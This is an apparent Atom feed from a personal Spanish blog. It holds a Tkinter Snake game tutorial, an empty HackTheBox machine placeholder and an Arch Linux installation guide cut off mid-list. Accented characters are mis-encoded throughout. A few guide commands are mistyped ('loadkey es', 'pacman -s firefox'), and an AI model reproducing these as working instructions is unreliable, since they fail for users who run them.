<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-08-12T19:17:52-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">BlogPersonal</title><subtitle>post de proyectos</subtitle><author><name>Eduardo Rivera</name></author><entry><title type="html">Cl√°sico juego de snake en python</title><link href="http://localhost:4000/python/Snake-Python/" rel="alternate" type="text/html" title="Cl√°sico juego de snake en python" /><published>2024-08-12T00:00:00-06:00</published><updated>2024-08-12T00:00:00-06:00</updated><id>http://localhost:4000/python/Snake-Python</id><content type="html" xml:base="http://localhost:4000/python/Snake-Python/"><![CDATA[<h1 id="historia">Historia</h1>
<p>El juego de la serpiente es uno de los videojuegos m√°s ic√≥nicos y conocidos, originalmente popularizado en tel√©fonos m√≥viles Nokia a finales de los a√±os 90. El objetivo es simple: controlar una serpiente que se mueve por la pantalla, consumiendo comida para crecer, mientras se evita chocar contra las paredes o contra s√≠ misma. Este juego, a pesar de su simplicidad, sigue siendo muy popular y ha sido recreado en innumerables plataformas y lenguajes de programaci√≥n.</p>

<h1 id="funcionalidad">Funcionalidad</h1>
<p>Este proyecto recrea el cl√°sico juego de la serpiente usando Python y la biblioteca gr√°fica Tkinter. La serpiente se mueve dentro de un √°rea de juego definida (un Canvas) y puede cambiar de direcci√≥n en respuesta a las teclas de flecha del teclado. Un cuadrado rojo representa la ‚Äúcomida‚Äù y aparece en posiciones aleatorias dentro del √°rea de juego. Cuando la serpiente come la comida, su longitud aumenta y la puntuaci√≥n del jugador se incrementa. El juego termina si la serpiente choca contra s√≠ misma.</p>

<h1 id="explicaci√≥n-del-c√≥digo">Explicaci√≥n del C√≥digo</h1>
<p>Inicializaci√≥n de la Ventana y Componentes</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">class</span> <span class="nc">SnakeApp</span><span class="p">():</span>
    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">root</span><span class="p">):</span>
        <span class="n">self</span><span class="p">.</span><span class="n">root</span> <span class="o">=</span> <span class="n">root</span>
        <span class="n">self</span><span class="p">.</span><span class="n">root</span><span class="p">.</span><span class="nf">title</span><span class="p">(</span><span class="sh">"</span><span class="s">Snake</span><span class="sh">"</span><span class="p">)</span>
        <span class="n">self</span><span class="p">.</span><span class="n">root</span><span class="p">.</span><span class="nf">geometry</span><span class="p">(</span><span class="sh">"</span><span class="s">450x480</span><span class="sh">"</span><span class="p">)</span>
        <span class="n">self</span><span class="p">.</span><span class="n">root</span><span class="p">.</span><span class="nf">configure</span><span class="p">(</span><span class="n">bg</span><span class="o">=</span><span class="sh">'</span><span class="s">#654321</span><span class="sh">'</span><span class="p">)</span>
        <span class="n">self</span><span class="p">.</span><span class="n">root</span><span class="p">.</span><span class="nf">resizable</span><span class="p">(</span><span class="n">width</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">height</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
</code></pre></div></div>
<p>Aqu√≠ se inicializa la ventana principal del juego. Se establece el tama√±o de la ventana, el color de fondo, y se impide que la ventana sea redimensionada.</p>

<h3 id="lienzo-y-etiquetas">Lienzo y Etiquetas</h3>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">self</span><span class="p">.</span><span class="n">canvas</span> <span class="o">=</span> <span class="nc">Canvas</span><span class="p">(</span><span class="n">root</span><span class="p">,</span> <span class="n">width</span><span class="o">=</span><span class="mi">400</span><span class="p">,</span> <span class="n">height</span><span class="o">=</span><span class="mi">400</span><span class="p">,</span> <span class="n">bg</span><span class="o">=</span><span class="sh">'</span><span class="s">black</span><span class="sh">'</span><span class="p">,</span> <span class="n">highlightthickness</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
<span class="n">self</span><span class="p">.</span><span class="n">canvas</span><span class="p">.</span><span class="nf">place</span><span class="p">(</span><span class="n">relx</span><span class="o">=</span><span class="mf">0.5</span><span class="p">,</span> <span class="n">rely</span><span class="o">=</span><span class="mf">0.5</span><span class="p">,</span> <span class="n">anchor</span><span class="o">=</span><span class="n">CENTER</span><span class="p">)</span>

<span class="n">self</span><span class="p">.</span><span class="n">score_label</span> <span class="o">=</span> <span class="nc">Label</span><span class="p">(</span><span class="n">root</span><span class="p">,</span> <span class="n">text</span><span class="o">=</span><span class="sh">"</span><span class="s">Puntuaci√≥n: 0</span><span class="sh">"</span><span class="p">,</span> <span class="n">font</span><span class="o">=</span><span class="p">(</span><span class="sh">"</span><span class="s">Arial</span><span class="sh">"</span><span class="p">,</span> <span class="mi">14</span><span class="p">),</span> <span class="n">bg</span><span class="o">=</span><span class="sh">'</span><span class="s">#654321</span><span class="sh">'</span><span class="p">,</span> <span class="n">fg</span><span class="o">=</span><span class="sh">'</span><span class="s">white</span><span class="sh">'</span><span class="p">)</span>
<span class="n">self</span><span class="p">.</span><span class="n">score_label</span><span class="p">.</span><span class="nf">place</span><span class="p">(</span><span class="n">relx</span><span class="o">=</span><span class="mf">0.5</span><span class="p">,</span> <span class="n">rely</span><span class="o">=</span><span class="mf">0.05</span><span class="p">,</span> <span class="n">anchor</span><span class="o">=</span><span class="n">CENTER</span><span class="p">)</span>
</code></pre></div></div>
<p>Se crea un Canvas donde se dibujar√° la serpiente y la comida. Adem√°s, se a√±ade una etiqueta para mostrar la puntuaci√≥n actual del jugador.</p>

<h3 id="configuraci√≥n-inicial-de-la-serpiente">Configuraci√≥n Inicial de la Serpiente</h3>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">self</span><span class="p">.</span><span class="n">snake</span> <span class="o">=</span> <span class="p">[]</span>
<span class="n">self</span><span class="p">.</span><span class="n">snake_x</span> <span class="o">=</span> <span class="mi">100</span>
<span class="n">self</span><span class="p">.</span><span class="n">snake_y</span> <span class="o">=</span> <span class="mi">100</span>
<span class="n">self</span><span class="p">.</span><span class="n">direction</span> <span class="o">=</span> <span class="p">{</span><span class="sh">'</span><span class="s">x</span><span class="sh">'</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span> <span class="sh">'</span><span class="s">y</span><span class="sh">'</span><span class="p">:</span> <span class="mi">0</span><span class="p">}</span>
<span class="n">self</span><span class="p">.</span><span class="n">initial_length</span> <span class="o">=</span> <span class="mi">3</span>
<span class="n">self</span><span class="p">.</span><span class="nf">create_snake</span><span class="p">()</span>
</code></pre></div></div>
<p>Se define la posici√≥n inicial de la serpiente y su direcci√≥n de movimiento. La serpiente comienza con una longitud de 3 segmentos.</p>

<h3 id="movimiento-de-la-serpiente">Movimiento de la Serpiente</h3>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">move</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">self</span><span class="p">.</span><span class="n">game_over</span><span class="p">:</span>
        <span class="n">self</span><span class="p">.</span><span class="n">snake_x</span> <span class="o">+=</span> <span class="n">self</span><span class="p">.</span><span class="n">direction</span><span class="p">[</span><span class="sh">'</span><span class="s">x</span><span class="sh">'</span><span class="p">]</span> <span class="o">*</span> <span class="n">self</span><span class="p">.</span><span class="n">square_size</span> 
        <span class="n">self</span><span class="p">.</span><span class="n">snake_y</span> <span class="o">+=</span> <span class="n">self</span><span class="p">.</span><span class="n">direction</span><span class="p">[</span><span class="sh">'</span><span class="s">y</span><span class="sh">'</span><span class="p">]</span> <span class="o">*</span> <span class="n">self</span><span class="p">.</span><span class="n">square_size</span>
        <span class="n">self</span><span class="p">.</span><span class="n">snake_x</span> <span class="o">%=</span> <span class="mi">400</span>
        <span class="n">self</span><span class="p">.</span><span class="n">snake_y</span> <span class="o">%=</span> <span class="mi">400</span>
        <span class="k">if</span> <span class="n">self</span><span class="p">.</span><span class="nf">check_collision</span><span class="p">():</span>
            <span class="n">self</span><span class="p">.</span><span class="nf">end_game</span><span class="p">()</span>
        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">snake</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">):</span>
            <span class="n">x1</span><span class="p">,</span> <span class="n">y1</span><span class="p">,</span> <span class="n">x2</span><span class="p">,</span> <span class="n">y2</span> <span class="o">=</span> <span class="n">self</span><span class="p">.</span><span class="n">canvas</span><span class="p">.</span><span class="nf">coords</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">snake</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
            <span class="n">self</span><span class="p">.</span><span class="n">canvas</span><span class="p">.</span><span class="nf">coords</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">snake</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">x1</span><span class="p">,</span> <span class="n">y1</span><span class="p">,</span> <span class="n">x2</span><span class="p">,</span> <span class="n">y2</span><span class="p">)</span>
        <span class="n">x1</span> <span class="o">=</span> <span class="n">self</span><span class="p">.</span><span class="n">snake_x</span>
        <span class="n">y1</span> <span class="o">=</span> <span class="n">self</span><span class="p">.</span><span class="n">snake_y</span>
        <span class="n">x2</span> <span class="o">=</span> <span class="n">x1</span> <span class="o">+</span> <span class="n">self</span><span class="p">.</span><span class="n">square_size</span>
        <span class="n">y2</span> <span class="o">=</span> <span class="n">y1</span> <span class="o">+</span> <span class="n">self</span><span class="p">.</span><span class="n">square_size</span>
        <span class="n">self</span><span class="p">.</span><span class="n">canvas</span><span class="p">.</span><span class="nf">coords</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">snake</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">x1</span><span class="p">,</span> <span class="n">y1</span><span class="p">,</span> <span class="n">x2</span><span class="p">,</span> <span class="n">y2</span><span class="p">)</span>
        <span class="n">head_coords</span> <span class="o">=</span> <span class="n">self</span><span class="p">.</span><span class="n">canvas</span><span class="p">.</span><span class="nf">coords</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">snake</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
        <span class="n">x1_r</span><span class="p">,</span> <span class="n">y1_r</span><span class="p">,</span> <span class="n">x2_r</span><span class="p">,</span> <span class="n">y2_r</span> <span class="o">=</span> <span class="n">self</span><span class="p">.</span><span class="n">canvas</span><span class="p">.</span><span class="nf">coords</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">rect_2</span><span class="p">)</span>
        <span class="nf">if </span><span class="p">(</span><span class="n">head_coords</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&lt;</span> <span class="n">x2_r</span> <span class="ow">and</span> <span class="n">head_coords</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">&gt;</span> <span class="n">x1_r</span><span class="p">)</span> <span class="ow">and</span> <span class="p">(</span><span class="n">head_coords</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">&lt;</span> <span class="n">y2_r</span> <span class="ow">and</span> <span class="n">head_coords</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">&gt;</span> <span class="n">y1_r</span><span class="p">):</span>
            <span class="n">self</span><span class="p">.</span><span class="nf">randomize_red_square_position</span><span class="p">()</span>
            <span class="n">self</span><span class="p">.</span><span class="nf">extend_snake</span><span class="p">()</span>
            <span class="n">self</span><span class="p">.</span><span class="n">score</span> <span class="o">+=</span> <span class="mi">1</span>
            <span class="n">self</span><span class="p">.</span><span class="n">score_label</span><span class="p">.</span><span class="nf">config</span><span class="p">(</span><span class="n">text</span><span class="o">=</span><span class="sa">f</span><span class="sh">"</span><span class="s">Puntuaci√≥n: </span><span class="si">{</span><span class="n">self</span><span class="p">.</span><span class="n">score</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="n">self</span><span class="p">.</span><span class="n">root</span><span class="p">.</span><span class="nf">after</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span> <span class="n">self</span><span class="p">.</span><span class="n">move</span><span class="p">)</span>
</code></pre></div></div>
<p>Este m√©todo se ejecuta repetidamente para mover la serpiente en la direcci√≥n actual. Tambi√©n verifica si la serpiente ha chocado contra s√≠ misma o si ha comido la comida roja. En caso de que coma, se actualiza la puntuaci√≥n y se incrementa la longitud de la serpiente.</p>

<h3 id="finalizaci√≥n-del-juego">Finalizaci√≥n del Juego</h3>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">end_game</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">self</span><span class="p">.</span><span class="n">game_over</span><span class="p">:</span>
        <span class="n">self</span><span class="p">.</span><span class="n">game_over</span> <span class="o">=</span> <span class="bp">True</span>
        <span class="n">messagebox</span><span class="p">.</span><span class="nf">showinfo</span><span class="p">(</span><span class="sh">"</span><span class="s">Game Over</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">¬°Has perdido!</span><span class="se">\n</span><span class="s">Presiona aceptar</span><span class="sh">"</span><span class="p">)</span>
        <span class="n">self</span><span class="p">.</span><span class="n">game_over</span> <span class="o">=</span> <span class="bp">False</span>
        <span class="n">self</span><span class="p">.</span><span class="nf">reset_game</span><span class="p">()</span>
</code></pre></div></div>
<p>Este m√©todo muestra un mensaje de ‚ÄúGame Over‚Äù y reinicia el juego si la serpiente choca contra s√≠ misma.</p>

<h3 id="posibles-mejoras">Posibles Mejoras</h3>
<ul>
  <li>
    <p><strong>Incremento de Velocidad</strong>: A medida que la puntuaci√≥n aumenta, se podr√≠a incrementar la velocidad de la serpiente para hacer el juego m√°s desafiante.</p>
  </li>
  <li>
    <p><strong>Obst√°culos</strong>: Agregar obst√°culos aleatorios en el √°rea de juego para aumentar la dificultad.</p>
  </li>
  <li>
    <p><strong>Sonidos</strong>: Incluir efectos de sonido para las acciones como comer la comida o chocar contra s√≠ misma.
Mejorar la Aleatorizaci√≥n del Cuadrado Rojo: Actualmente, el cuadrado rojo aparece en posiciones sim√©tricas. Ser√≠a mejor permitir que aparezca en cualquier parte del lienzo.</p>
  </li>
</ul>

<h3 id="recomendaci√≥n">Recomendaci√≥n</h3>
<p>Este proyecto es un excelente punto de partida para aprender sobre la programaci√≥n de interfaces gr√°ficas y la l√≥gica de juegos en Python. Se recomienda experimentar con diferentes mejoras para aprender c√≥mo afectan la jugabilidad y la interacci√≥n del usuario.</p>]]></content><author><name>Eduardo Rivera</name></author><category term="python" /><category term="juegos" /><summary type="html"><![CDATA[Revive la nostalgia con Snake, el cl√°sico juego de la serpiente, ahora hecho en Python! üêçüìú Disfruta de un c√≥digo simple y adictivo que crece a medida que recoges alimentos. Ideal para aprender y jugar. üöÄüéÆ]]></summary></entry><entry><title type="html">M√°quina GreenHorn de HackTheBox con dificultad f√°cil</title><link href="http://localhost:4000/hackthebox/Maquina-GreenHorn/" rel="alternate" type="text/html" title="M√°quina GreenHorn de HackTheBox con dificultad f√°cil" /><published>2024-07-23T00:00:00-06:00</published><updated>2024-07-23T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/Maquina-GreenHorn</id><content type="html" xml:base="http://localhost:4000/hackthebox/Maquina-GreenHorn/"><![CDATA[<h2 id="pr√≥ximamente">Pr√≥ximamente‚Ä¶</h2>]]></content><author><name>Eduardo Rivera</name></author><category term="HackTheBox" /><category term="pixelated" /><category term="pluck 4.7.18" /><summary type="html"><![CDATA[La m√°quina GreenHorn nos muestra las posibilidades de encontrar contrase√±as incluso cuando est√°n ocultas en una imagen. Aunque esta m√°quina en s√≠ misma no representa un gran desaf√≠o, el proceso para descubrir la contrase√±a resulta ser bastante interesante y educativo.]]></summary></entry><entry><title type="html">Instalaci√≥n, configuraci√≥n y personalizaci√≥n de ArchLinux.</title><link href="http://localhost:4000/linux/ArchLinux/" rel="alternate" type="text/html" title="Instalaci√≥n, configuraci√≥n y personalizaci√≥n de ArchLinux." /><published>2024-07-19T00:00:00-06:00</published><updated>2024-07-19T00:00:00-06:00</updated><id>http://localhost:4000/linux/ArchLinux</id><content type="html" xml:base="http://localhost:4000/linux/ArchLinux/"><![CDATA[<h2 id="arch-linux">Arch Linux</h2>

<p style="text-align: justify;">
    <img src="/assets/images/ArchLinux/icons8-arch-linux-480.png" style="float: left; margin: 0 5px 0 0; width: 90px; height: auto;" />
    Arch Linux es una distribuci√≥n de Linux de prop√≥sito general x86-64 desarrollada de forma independiente. Se esfuerza por proporcionar las √∫ltimas versiones estables de la mayor√≠a del software, siguiendo un modelo de rolling-release. La instalaci√≥n por defecto es intencionadamente m√≠nima para que los usuarios puedan a√±adir solo los paquetes que necesiten.
</p>

<p style="text-align: justify;">
En este post se abordar√° la instalaci√≥n de manera sencilla y la explicaci√≥n de ciertos detalles que hay que tomar en cuenta a la hora de instalar el sistema. Una mala configuraci√≥n y/o instalaci√≥n puede terminar da√±ando las particiones si se est√° instalando junto con alg√∫n otro sistema operativo.
</p>

<h2 id="descarga">Descarga</h2>
<p>Para descargar Arch Linux, es necesario hacerlo desde su p√°gina oficial. No hay un enlace directo para descargar la ISO; en su lugar, se deben utilizar los enlaces Torrent o Magnet.</p>

<p><a href="https://archlinux.org/download/">Descarga de ArchLinux</a></p>

<p>Podemos ver los enlaces mencionados anteriormente en el apartado <strong>BitTorrent Download (recommended)</strong>:</p>

<p align="center">
<img src="/assets/images/ArchLinux/ArchPagina.png" />
</p>

<p>En este caso se descargo la version de Torrent, para poder descargar este archivo se puede usar <a href="https://www.utorrent.com/">uTorrent</a> para Windows o <strong>qBittorrent</strong> para Linux</p>

<p align="center">
<img src="/assets/images/ArchLinux/utorret.png" />
</p>

<h2 id="instalaci√≥n-primera-parte">Instalaci√≥n primera parte</h2>
<p style="text-align: justify;"> 
Una vez descargada la ISO, procederemos a utilizar <a href="https://rufus.ie/es/">Rufus</a>, <a href="https://www.ventoy.net/en/download.html">Ventoy</a> u otro programa similar para grabar la imagen en una memoria USB. Alternativamente, tambi√©n puedes utilizar la ISO para instalar el sistema en una m√°quina virtual.

Una vez que hayamos iniciado el sistema, ya sea en la m√°quina virtual o de manera nativa, nos aparecer√° una ventana como la siguiente:

<p style="text-align: center;">
<img src="/assets/images/ArchLinux/EFFI.png" />
</p>
<p style="text-align: justify;">

Seleccionaremos la primera opci√≥n y presionaremos Enter para iniciar Arch Linux:

</p>
<p style="text-align: center;">

<img src="/assets/images/ArchLinux/bienvenida.png" />
</p>
</p>
<p style="text-align: justify;"> 
Una vez que estemos en la pantalla de bienvenida, estaremos directamente como el usuario root. Lo primero que haremos es usar un comando para configurar el teclado en espa√±ol. Si no realizamos este paso, el teclado estar√° configurado en ingl√©s. En caso de contar con un teclado en ingl√©s, no deber√≠a representar ning√∫n problema. De lo contrario, utilizaremos el siguiente comando:
</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>loadkey es
</code></pre></div></div>
<h2 id="Configuracion-de-los-discos"> Configuraci√≥n de los discos</h2>
<p style="text-align: justify;">
<strong>Nota:</strong> Si se est√° instalando de manera nativa y se tiene instalado otro sistema operativo como Windows, es necesario hacer los siguientes pasos. De lo contrario, se pueden <a href="#instalacion-segunda-parte">omitir</a>.
</p>
<p style="text-align: justify;">
Para la instalaci√≥n de Arch es necesario tener dos particiones, las cuales son muy importantes a la hora de instalar el sistema. Lo primero que haremos es usar el comando:

</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lsblk
</code></pre></div></div>
<p style="text-align: justify;">
El comando anterior nos muestra un listado de los discos que tenemos en nuestro sistema. Es recomendable particionar el disco de antemano, ya sea usando el gestor de discos de Windows o alguna herramienta de Linux si se tiene una partici√≥n previa.
Una vez hecho esto, procederemos a usar el siguiente comando:
</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cfdisk
</code></pre></div></div>
<p style="text-align: justify;">
Ejemplo de los comandos mencionados anteriormente:
</p>
<p style="text-align: center;">
<img src="/assets/images/ArchLinux/ConfDisk.png" />
</p>
<p style="text-align: justify;">
Al ejecutar el comando nos aparece lo siguiente:
</p>
<p style="text-align: center;">
<img src="/assets/images/ArchLinux/gpt.png" />
</p>
<p style="text-align: justify;">
Seleccionamos GPT y presionamos Enter. Esto nos llevar√° a la interfaz de nuestro disco, donde podremos ver todas nuestras particiones. Es importante destacar que cualquier cambio realizado debe ser verificado varias veces antes de escribir los cambios, ya que esto puede da√±ar las dem√°s particiones. El espacio que vayamos a usar deber√≠a aparecer con la leyenda <strong style="color: green;">"Free space"</strong>. Como se mencion√≥ anteriormente, este paso debe realizarse desde otro sistema. Cabe aclarar que esto no aplica si se va a instalar Arch en todo el disco.
</p>
<p style="text-align: justify;">
Con <strong>Resize</strong> le quitamos 1 GB al disco a utilizar. Esta partici√≥n de 1 GB, con <strong>Type</strong>, se debe seleccionar <strong>EFI System</strong>. La partici√≥n de mayor volumen debe tener el tipo <strong>Linux filesystem</strong>. Al final, deber√≠amos tenerlo de esta manera:
</p>
<p style="text-align: center;">
<img src="/assets/images/ArchLinux/discos.png" />
</p>
<p style="text-align: justify;">
Para aguardar los cambios es necesario seleccionar <strong>Write</strong> y aceptar los cambios
</p>

<h2 id="instalacion-segunda-parte">Instalaci√≥n segunda parte</h2>

<p>Continuando con la instalacion procedemos a usar el siguiente comando:</p>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>archinstall
</code></pre></div></div>
<p><strong>Nota</strong>: es necesario tener internet para ejecutar este comando</p>

<p>Se nos desplegar√° lo siguiente:</p>

<p style="text-align: center;">
<img src="/assets/images/ArchLinux/archinstall.png" />
</p>
<p style="text-align: justify;">
Aqu√≠ es totalmente personalizable, y se deben tomar en cuenta los siguientes datos:
</p>
<ol style="text-align: justify;">
  <li><strong>Lenguaje</strong>: Puedes dejarlo en ingl√©s o cambiarlo a espa√±ol.</li>
  <li><strong>Mirrors</strong>: Son servidores que alojan los paquetes de software y las actualizaciones del sistema. Aqu√≠ puedes seleccionar el pa√≠s de procedencia.</li>
  <li><strong>Locales</strong>: Aqu√≠ se selecciona la distribuci√≥n del teclado. Si es ingl√©s, puede ser <code>en_US</code>; y si es espa√±ol, puede ser <code>es_MX</code> para M√©xico o <code>es_ES</code> para Espa√±a. La opci√≥n puede variar dependiendo del pa√≠s.</li>
  <li><strong>Configuraci√≥n de discos</strong>: Aqu√≠ se desplegar√°n las siguientes opciones:
  <p style="text-align: center;">
<img src="/assets/images/ArchLinux/MVe.png" alt="Configuraci√≥n de discos" />
</p>

<ul>
  <li>La primera opci√≥n se utiliza cuando se est√° usando una m√°quina virtual o cuando se desea hacer una instalaci√≥n limpia en un equipo, eliminando todos los datos previos. Al seleccionar esta opci√≥n, se mostrar√° c√≥mo ser√° particionado y formateado el disco. Se debe seleccionar el formato <code>ext4</code> y guardar los cambios.</li>
  <li>La segunda opci√≥n consiste en una instalaci√≥n manual y se aplica solo si ya tienes otro sistema operativo instalado. Para ello, los discos deben estar previamente <a href="#Configuracion-de-los-discos">configurados</a>. Al seleccionar esta opci√≥n, aparecer√° la siguiente ventana:
  <p style="text-align: center;">
  <img src="/assets/images/ArchLinux/manual2.png" alt="Configuraci√≥n manual" />
  </p>
  Las propiedades que deben tener los discos son:
  <ul>
      <li>Disco de 1 GB
        <ul>
          <li>Asignaci√≥n de punto de montaje: <code>/boot</code></li>
          <li>Formato: <code>Fat32</code></li>
        </ul>
      </li>
      <li>Disco de mayor tama√±o
        <ul>
          <li>Asignaci√≥n de punto de montaje: <code>/</code></li>
          <li>Formato: <code>ext4</code></li>
        </ul>
      </li>
    </ul>

  Finalmente, deber√≠amos tenerlo de esta manera:

  <p style="text-align: center;">
    <img src="/assets/images/ArchLinux/manual3.png" alt="Configuraci√≥n final" />
    </p>
    
  Confirma los cambios y sal del men√∫.</li>
</ul>
  </li>
  <li><strong>Bootloader</strong>: Se deja por defecto en GRUB.</li>
  <li><strong>Swap</strong>: Se deja por defecto en True.</li>
  <li><strong>Hostname</strong>: Se puede modificar al otro nombre o se deja por defecto</li>
  <li><strong>Root password</strong>: Se establece una contrase√±a exclusiva para root</li>
   <li><strong>User account </strong>: Se crea una cuenta de usuario aparte del usuario root. Esta cuenta requerir√° un nombre de usuario y una contrase√±a. Adem√°s, esta cuenta se a√±adir√° al grupo de wheel para permitir permisos administrativos.</li>
  <li><strong>Profile</strong>: En esta opci√≥n, seleccionamos el entorno gr√°fico. Aqu√≠ podemos elegir entre diferentes entornos de escritorio, como los m√°s conocidos: GNOME, KDE Plasma, entre otros. Asimismo, podemos seleccionar el gestor de inicio de sesi√≥n, como GDM, SDDM, etc.</li>
  <li><strong>Audio</strong>: En esta opci√≥n, puedes seleccionar cualquiera de las opciones disponibles, ya que todas funcionan correctamente.</li>
  <li><strong>Kernel</strong>: Se queda como esta en Linux se tienes mas conocimiento del tema puede seleccionar al gusto.</li>
  <li><strong>Networking Configuration</strong>: Selecciona la opci√≥n de NetworkManager. Es importante que no dejes esta opci√≥n sin seleccionar, ya que, de lo contrario, no podr√°s conectarte a Internet.</li>
  <li><strong>Timezone</strong>: Se selecciona la zona horaria.</li>
  <li><strong>Automatic time sync</strong>: Se deja en true.</li>
 
  <li><strong>Optional repositories</strong>: Se puede omitir esta opci√≥n</li>
 </ol>

<p style="text-align: justify;">
Una vez seleccionada la opciones adecuadas lo tendremos de la siguiente manera:
</p>

<p style="text-align: center;">
<img src="/assets/images/ArchLinux/Archinstall2.png" />
</p>

<p style="text-align: justify;">
Selecciona la opci√≥n de Instalar. Una vez que comience el proceso, se iniciar√° una cuenta regresiva. Al finalizar esta cuenta regresiva, presiona Enter para comenzar la instalaci√≥n.
</p>
<p style="text-align: justify;">
La instalaci√≥n puede llevar algo de tiempo asi que solo queda esperar. Si todo sale bien nos debe aparecer la siguiente pantalla:     
</p>

<p style="text-align: center;">
<img src="/assets/images/ArchLinux/finalidad.png" />
</p>
<p style="text-align: justify;">
En esta opci√≥n se debe seleccionar no y dar enter para salir.
</p>

<p style="text-align: justify;">
Para comenzar comenzar nuestro ArchLinux se coloca el siguiente comando para reiniciar el sistema:
</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reboot
</code></pre></div></div>
<p style="text-align: justify;">
Cuando se reinicie, debe aparecer el gestor de inicio de sesi√≥n con el nombre de usuario que configuraste previamente. Ingresa la respectiva contrase√±a. Una vez iniciada tu sesi√≥n, deber√≠as ver tu escritorio.
</p>

<p style="text-align: center;">
<img src="/assets/images/ArchLinux/escritorio.png" />
</p>
<p style="text-align: center;">
<img src="/assets/images/ArchLinux/neo.png" />
</p>

<h2 id="herramientas">Herramientas</h2>
<p>Actualizaci√≥n del sistema:</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>pacman <span class="nt">-Syu</span>
</code></pre></div></div>
<p>Instalaci√≥n de herramientas:</p>
<ul>
  <li>Instalaci√≥n de Git
    <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>pacman <span class="nt">-S</span> git 
</code></pre></div>    </div>
  </li>
  <li>Instalaci√≥n de kitty (Terminal):
    <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>pacman <span class="nt">-S</span> kitty
</code></pre></div>    </div>
  </li>
  <li>Instalaci√≥n de Firefox (Navegador)
    <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>pacman <span class="nt">-s</span> firefox
</code></pre></div>    </div>
  </li>
  <li>Instalaci√≥n de Yay (AUR Helper):
    <ul>
      <li>Primero, instala los paquetes necesarios para compilar Yay:
        <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>pacman <span class="nt">-S</span> base-devel
</code></pre></div>        </div>
      </li>
      <li>Clona el repositorio de Yay:
        <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://aur.archlinux.org/yay.git
</code></pre></div>        </div>
      </li>
      <li>Navega al directorio clonado e instala Yay:
        <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd </span>yay
makepkg <span class="nt">-si</span>
</code></pre></div>        </div>
      </li>
    </ul>
  </li>
  <li>htop (Monitor del sistema interactivo):
    <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>pacman <span class="nt">-S</span> htop
</code></pre></div>    </div>
  </li>
  <li>neofetch (Informaci√≥n del sistema)
    <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>pacman <span class="nt">-S</span> neofetch
</code></pre></div>    </div>
  </li>
  <li>vim y neovim (Editor de texto avanzado):
    <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>pacman <span class="nt">-S</span> vim neovim
</code></pre></div>    </div>
  </li>
  <li>nano (Editor de texto simple)
    <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>pacman <span class="nt">-S</span> nano
</code></pre></div>    </div>
  </li>
  <li>Visual Studio Code (Editor de c√≥digo fuente)
